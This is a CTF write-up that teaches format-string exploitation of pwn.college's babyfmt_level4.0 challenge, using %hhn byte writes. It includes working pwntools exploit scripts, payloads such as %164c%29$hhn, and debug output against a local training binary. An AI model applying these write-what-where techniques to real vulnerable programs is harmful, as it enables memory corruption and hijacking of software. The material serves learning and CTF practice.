---
title: "Write-What-Where - 1 byte"
description: ""
author: "İsmail BOZKURT"
date: 2025-08-19
tags:
  - binary-exploitation
  - format-string-attack
  - pwn
  - CTF
categories:
  - Exploitation
  - Pwn
  - Format-String-Attack
---

## Format String Attack - Write-What-Where - 1 byte

There so many format string specifiers. But there one special specifier making huge difference above all others. **%n** specifier comes into the play at this point.

Here is variants of **%n** format string specifier

### Variants of `%n`

Different length modifiers can be used with `%n` to control the type of the target variable:

| Specifier | Argument Type   | Written Value Type |
| --------- | --------------- | ------------------ |
| `%n`      | `int *`         | `int`              |
| `%hn`     | `short *`       | `short`            |
| `%hhn`    | `signed char *` | `signed char`      |
| `%ln`     | `long *`        | `long`             |
| `%lln`    | `long long *`   | `long long`        |
| `%zn`     | `size_t *`      | `size_t`           |
| `%tn`     | `ptrdiff_t *`   | `ptrdiff_t`        |
| `%jn`     | `intmax_t *`    | `intmax_t`         |

Assume `"ABCDEFG"` (7 chars) is printed:

- **Using `%n` with `int` (4 bytes):**
    
```css
Address of i → 07 00 00 00
```
    
- **Using `%hn` with `short` (2 bytes):**
    
```css
Address of s → 07 00
```

- **Using `%hhn` with `signed char` (1 byte):**
    
```css
Address of c → 07
```
    
- **Using `%lln` with `long long` (8 bytes):**
    
```css
Address of ll → 07 00 00 00 00 00 00 00
```
  
---

Attackers use `%hhn` and `%hn` a lot because they allow **byte-wise or word-wise precision overwriting** of memory, instead of writing a full 4 or 8 bytes at once.

### babyfmt_level4.0

The below variant is the perfect example for this use case.

```perl
root@5cd19b840558:/host# ./babyfmt_level4.0 
###
### Welcome to ./babyfmt_level4.0!
###

This challenge reads in some bytes, calls printf on that string, and allows you to perform
a format string attack. Through this series of challenges, you will become painfully familiar
with the concept of Format String Attacks!

This challenge allows you to make a 256-sized format string.

This challenge requires you to set a win value, located in the .bss, to 0xa5. If you successfully
pull that off, the challenge will give you the flag! You will need to use %n to set this value

The win value in the .bss is located at 0x404170! Remember to write this in little endian in your format string.
Remember, you can swap %n with %lx to see what address you will be writing into to make sure you have the.correct offset.

I will now read up to 256 bytes. Send your data!
asd
Received 4 bytes!

I will now call printf on your data!

asd

And now, let's check the win value!
Checking win value...
... desired win value: 0xa5
... written win value: 0
... INCORRECT!
### Goodbye!
```

Before start some preps.

#### find_offset_and_padlen.py

```python
from pwn import *

# Load binary and configure context
elf = context.binary = ELF('./babyfmt_level4.0', checksec=False)
context.log_level = 'debug'

gdbscript = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gdbscript)
    return process([elf.path])

#### send helper ####
def send_fmt(payload):
    io = start()
    try:
        io.sendafter(b'Send your data!\n', payload)
        data = io.recvall(timeout=0.01)
        return data
    finally:
        io.close()

f = FmtStr(send_fmt)

success(f'User input starts at  : {f.offset}')
success(f'Needed pads           :{f.padlen}')
success(f'Numbwritten           :{f.numbwritten}')
```

**The result:**

```perl
[DEBUG] Received 0xf4 bytes:
    b'Received 33 bytes!\n'
    b'\n'
    b'I will now call printf on your data!\n'
    b'\n'
    b'aaaabaaacaaadaaaeaaaSTART0x6361616162616161END\n'
    b"And now, let's check the win value!\n"
    b'Checking win value...\n'
    b'... desired win value: 0xa5\n'
    b'... written win value: 0\n'
    b'... INCORRECT!\n'
    b'### Goodbye!\n'
[*] Found format string offset: 27
[+] User input starts at  : 27
[+] Needed pads           :1
[+] Numbwritten           :0
```
##### get *win_value* and *win_address* with regex practice.

```python
In [11]: import re
    ...: 
    ...: text = """
    ...: ### Welcome to ./babyfmt_level4.0! ###
    ...: This challenge requires you to set a win value, located in the .bss, to 0xa5.
    ...: The win value in the .bss is located at 0x404170! Remember to write this in little endian.
    ...: """
    ...: 
    ...: match = re.findall(r"0x[0-9a-fA-F]+", text)
    ...: if match:
    ...:     print(match)
    ...: 
['0xa5', '0x404170']
```

##### **get_flag.py 1st:**

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './babyfmt_level4.0')
context.log_level = 'debug'
#context.log_level = 'info'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *func+445
continue
'''.format(**locals())

# -- Exploit goes here --

def get_win_address_and_value(text):
    match = re.findall(rb"0x[0-9a-fA-F]+", text)
    if match:
        return match
    return None

io = start()

#### get win_value and win_address ####
leaks = get_win_address_and_value(io.recvuntil(b'offset.'))
desired_val = int(leaks[0], 16)
win_addr    = int(leaks[1], 16)

info(f'Desired Value: {desired_val:#x}')
info(f'Win Address  : {win_addr:#x}')

io.interactive()
```

**The result:**

```perl
[DEBUG] Received 0x11e bytes:
    b'\n'
    b'The win value in the .bss is located at 0x404170! Remember to write this in little endian in your format string.\n'
    b'Remember, you can swap %n with %lx to see what address you will be writing into to make sure you have the.correct offset.\n'
    b'\n'
    b'I will now read up to 256 bytes. Send your data!\n'
[*] Desired Value: 0xa5
[*] Win Address  : 0x404170
[*] Switching to interactive mode
```

##### **get_flag.py 2nd:**

The below variant of **get_flag.py** script, writing **win_value** at the specified address(**win_address**).

The **fmt** variable looks like this: `%165c%29$hhn`

>What does this do ?
>>`%165c%29$hhn` is a classic format-string write gadget:

>> **`%165c`** → prints a single character with a _minimum field width_ of 165.  
    That means `printf` outputs **165 bytes total** (164 spaces of padding + 1 character).  
    Net effect: the internal “characters printed so far” counter becomes **165** (`0xA5`).
    
>> -  **`%29$hhn`** → `%n`-family write using:
    
>> - `hhn` → write **only 1 byte** (low 8 bits) of the count to memory.
        
>> - `29$` → use the **29-th argument** as the _pointer destination_.  
        (In payload, arranged that the **29th argument is `win_address`**.)

Putting it together:

1. first place `win_address` somewhere in the argument list (so it sits at position 29 on the stack for `printf`).
    
2. `%165c` bumps the printed-chars count to **165**.
    
3. `%29$hhn` writes **`165 mod 256 = 0xA5`** into the **byte at `win_address`**.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './babyfmt_level4.0')
context.log_level = 'debug'
#context.log_level = 'info'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *func+445
continue
'''.format(**locals())

# -- Exploit goes here --

def get_win_address_and_value(text):
    match = re.findall(rb"0x[0-9a-fA-F]+", text)
    if match:
        return match
    return None

def build_payload(fmt: bytes, addrs: list[int], padlen: int, filler: bytes = b"|") -> bytes:
    ptrsz = context.bytes
    layout = { padlen: fmt }
    for i, a in enumerate(addrs):
        off = padlen + 16 + i*ptrsz
        layout[off] = p64(a) if ptrsz == 8 else p32(a)
    return fit(layout, filler=filler)



io = start()

#### get win addr ####
leaks = get_win_address_and_value(io.recvuntil(b'offset.'))
desired_val = int(leaks[0], 16)
win_addr    = int(leaks[1], 16)

info(f'Desired Value: {desired_val:#x}')
info(f'Win Address  : {win_addr:#x}')

#### set win value(0x5a) at win_addr ####
offset = 27
padlen = 1

fmt = flat(f'%{desired_val}c%{offset+16//context.bytes}$hhn')
payload = build_payload(fmt, [win_addr], padlen=padlen)

io.sendafter(b'data!\n', payload)

io.interactive()
```

**The failure result:**

```perl
I will now call printf on your data!

|                                                                                                                                                                    C||||pA@
And now, let's check the win value!
Checking win value...
... desired win value: 0xa5
... written win value: 0xa6
... INCORRECT!
### Goodbye!
[*] Got EOF while reading in interactive
```

Why 0xa6 not 0xa5. This happened because when we aligned the stack for correct spot to win_address. We settled padlen value as 1. The extra 1 comes from there.

if we correct the calculation like this. Problem will solve.

```python
fmt = flat(f'%{desired_val-padlen}c%{offset+16//context.bytes}$hhn')
```

The payload became : `%164c%29$hhn`

**The result:**

```perl
And now, let's check the win value!
Checking win value...
... desired win value: 0xa5
... written win value: 0xa5
... SUCCESS! Here is your flag:
pwn.college{sp4****************************EzW}
### Goodbye!
```

Once a wise man i work with, said to me this:

*You can’t automate the process before understanding how to do it manually. * - Evren Pazoğlu

So hope helps you to understand the process. Now make it simple with pwntools 2 different way.

##### get_flag_fmtstr_payload.py

This one using pwntools's **fmtstr_payload** method to create **write-what-where** payload.
Basically its replicating from [fmtstr.py|Line 1027](https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/fmtstr.py#L1027) .

**Some notes:**
>numbwritten set as padlen, as you know the alignment in the stack we need to pad 1.

>adding random string before payload, the length must equal to padlen. Simply adding 1 random string. For more information: [randoms](https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/util/fiddling.py#L458)

You can extend as many as you want with this approach. Manual approach needs more work to do that. This is really make life easier.
```python
exe = context.binary = ELF(args.EXE or './babyfmt_level4.0')
context.log_level = 'debug'
#context.log_level = 'info'



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *func+445
continue
'''.format(**locals())

# -- Exploit goes here --

def get_win_address_and_value(text):
    match = re.findall(rb"0x[0-9a-fA-F]+", text)
    if match:
        return match
    return None

io = start()

#### get win addr ####
leaks = get_win_address_and_value(io.recvuntil(b'offset.'))
desired_val = int(leaks[0], 16)
win_addr    = int(leaks[1], 16)

info(f'Desired Value: {desired_val:#x}')
info(f'Win Address  : {win_addr:#x}')

#### set win value(0x5a) at win_addr ####
offset = 27
padlen = 1

writes = {win_addr: desired_val}
payload = fmtstr_payload(offset=27, writes=writes, numbwritten=padlen, write_size='byte')
payload = randoms(padlen).encode()+payload
info(f'Final payload: {payload}')

io.sendafter(b'data!\n', payload)

io.interactive()
```


##### get_flag_FmtStr.py

This one make more easier than previous 2 approach. Settling needed **offset**, **padlen** and **helper method** values. and than just fired up. Rest is handled by pwntools <3.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './babyfmt_level4.0')
#context.log_level = 'debug'
context.log_level = 'info'



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *func+445
continue
'''.format(**locals())

# -- Exploit goes here --

def get_win_address_and_value(text):
    match = re.findall(rb"0x[0-9a-fA-F]+", text)
    if match:
        return match
    return None

#### send helper ####
def send_fmt(payload):
    io.sendafter(b'data!\n', payload)

io = start()

#### get win addr ####
leaks = get_win_address_and_value(io.recvuntil(b'offset.'))
desired_val = int(leaks[0], 16)
win_addr    = int(leaks[1], 16)

info(f'Desired Value: {desired_val:#x}')
info(f'Win Address  : {win_addr:#x}')

### set desired value(0x5a) at win_addr ####
offset = 27
padlen = 1

f = FmtStr(send_fmt, offset=offset, padlen=padlen)
f.write(win_addr, desired_val)
f.execute_writes()

try:
    io.recvuntil(b'Here is your flag:\n')
    flag = io.recvline().strip()
    io.critical(f'FLAG: {flag}')
except:
    io.error("Couldn't hack it!")
finally:
    io.close()
```

## References

- **glibc Manual – Formatted Output**  
    [https://www.gnu.org/software/libc/manual/html_node/Formatted-Output.html](https://www.gnu.org/software/libc/manual/html_node/Formatted-Output.html)
    
- **man 3 printf** (POSIX printf specifiers, including `%n`)  
    [https://man7.org/linux/man-pages/man3/printf.3.html](https://man7.org/linux/man-pages/man3/printf.3.html)
    
- **Pwntools Documentation – Format String Exploits**  
    [https://docs.pwntools.com/en/stable/fmtstr.html](https://docs.pwntools.com/en/stable/fmtstr.html)
    
- **Pwntools Source – `fmtstr_payload` Implementation**  
    [https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/fmtstr.py#L1027](https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/fmtstr.py#L1027)
    
- **Pwntools Utility – `randoms()`**  
    [https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/util/fiddling.py#L458](https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/util/fiddling.py#L458)
    
- **Exploit Education – Format String Vulnerabilities**  
    [https://exploit.education/phoenix/format-string/](https://exploit.education/phoenix/format-string/)
    
- **OWASP Testing Guide – Format String Attack**  
    [https://owasp.org/www-community/attacks/Format_string_attack](https://owasp.org/www-community/attacks/Format_string_attack)
    
- **LiveOverflow CTF Video (Format String Basics)**  
    [https://www.youtube.com/watch?v=0WvrSfcdq1I](https://www.youtube.com/watch?v=0WvrSfcdq1I)